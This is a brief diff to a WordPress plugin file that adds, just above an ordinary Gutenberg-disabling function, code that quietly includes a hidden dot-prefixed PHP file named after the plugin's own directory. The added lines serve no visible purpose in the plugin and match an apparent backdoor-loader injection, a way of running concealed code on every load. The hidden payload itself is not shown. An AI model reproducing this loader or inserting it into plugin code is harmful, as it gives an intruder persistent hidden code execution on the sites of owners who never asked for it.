@@ -6,6 +6,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  * @param $post
  * @return bool
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function vcv_disable_gutenberg_for_classic_editor( $post ) {
 	return false;
 }
